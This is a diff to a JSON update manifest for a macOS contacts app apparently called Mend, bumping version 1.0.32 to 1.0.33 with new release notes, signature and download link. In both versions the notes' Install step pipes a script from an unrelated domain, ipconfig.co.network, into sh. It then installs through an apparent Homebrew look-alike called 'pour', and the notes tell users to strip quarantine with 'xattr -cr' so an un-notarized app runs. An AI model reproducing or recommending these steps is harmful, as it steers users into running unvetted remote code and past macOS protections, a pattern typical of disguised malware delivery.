@@ -1,14 +1,14 @@
 {
-  "version": "1.0.32",
-  "notes": "## Mend 1.0.32 — 13 Nov 2026\n\n- **\"Is everything in iCloud?\" is easy to find.** It was a section far down the Contacts Overview. It now has its own entry at the top of the Contacts side list, a button in the page header, a banner on Overview, and a link on every iPhone backup and \"On My Mac\" page.\n\n### Install\n\n- **macOS on Apple silicon** (M1 and newer): `curl -fsSL https://ipconfig.co.network/pour/install | sh` then `pour install --cask mend`\n\nFirst launch on macOS after a manual DMG install: `xattr -cr /Applications/Mend.app` (Mend is ad-hoc signed, not notarized).",
-  "pub_date": "2026-11-13T01:15:18Z",
+  "version": "1.0.33",
+  "notes": "## Mend 1.0.33 — 13 Nov 2026\n\n- **\"Is everything in iCloud?\" has a row for this Mac.** It lists each account on the Mac with its contact count (iCloud, On My Mac, Google…), marks the default account, and says where new contacts go. If Mend is not allowed to read the Mac's contacts, the row says so with an **Allow access** button, instead of showing nothing for the Mac.\n\n### Install\n\n- **macOS on Apple silicon** (M1 and newer): `curl -fsSL https://ipconfig.co.network/pour/install | sh` then `pour install --cask mend`\n\nFirst launch on macOS after a manual DMG install: `xattr -cr /Applications/Mend.app` (Mend is ad-hoc signed, not notarized).",
+  "pub_date": "2026-11-13T01:25:47Z",
   "platforms": {
     "darwin-aarch64": {
-      "signature": "dW50cnVzdGVkIGNvbW1lbnQ6IHNpZ25hdHVyZSBmcm9tIHRhdXJpIHNlY3JldCBrZXkKUlVUSUVLMDNkb2V5SDFEUS9kR21xd0M3cTByaHQxN1ZWWElIZjhRSTkxUDA5Qkl4NTZIcWF4bWFQQjdyaGlDMGRDQTNYVGFSYzZyNFdMNDhTbkh5K01PZUExajkzTTU0UkEwPQp0cnVzdGVkIGNvbW1lbnQ6IHRpbWVzdGFtcDoxNzk0NTMyNDczCWZpbGU6TWVuZC5hcHAudGFyLmd6CXZlcnNpb246MS4wLjMyCm0zbVBXdEpzcm1DT0FrNWZ4Q0xIbWU4Qk9qbjNhMEFIQzJzeVZNNllZWkhqYkdCeS9QSlRIbng4TExnMkZFNFMwc0QwS09PTlVBSkdkVnc2c0t0QUR3PT0K",
-      "url": "https://github.com/JKS-sys/mend-08-oct-2026-releases/releases/download/v1.0.32/Mend_aarch64.app.tar.gz"
+      "signature": "dW50cnVzdGVkIGNvbW1lbnQ6IHNpZ25hdHVyZSBmcm9tIHRhdXJpIHNlY3JldCBrZXkKUlVUSUVLMDNkb2V5SDRrNVFnOGJCdWxSOFhZcDYzOVZVQlByVXpicFdMQnpGclJLdXV3MVBlcmoyd3FKUENUNTYrd1J2cWVWVUxCaVJVUk5MeTR3bzRDM3NwOFZncjJaTFE0PQp0cnVzdGVkIGNvbW1lbnQ6IHRpbWVzdGFtcDoxNzk0NTMzMTEzCWZpbGU6TWVuZC5hcHAudGFyLmd6CXZlcnNpb246MS4wLjMzCjYrdGVXR3AwbndlYjV2dFEzaXNuZk1vSUt4VDNrcDYyT1NUYkQ1Z2gwNlpyMFJ1QkltYk83ZVhKV2ZzZkFrNFltYkV0V3hKWDFpVnFYY1dGQWEwUUJ3PT0K",
+      "url": "https://github.com/JKS-sys/mend-08-oct-2026-releases/releases/download/v1.0.33/Mend_aarch64.app.tar.gz"
     }
   },
   "downloads": {
-    "mac_arm": "Mend_1.0.32_aarch64.dmg"
+    "mac_arm": "Mend_1.0.33_aarch64.dmg"
   }
 }
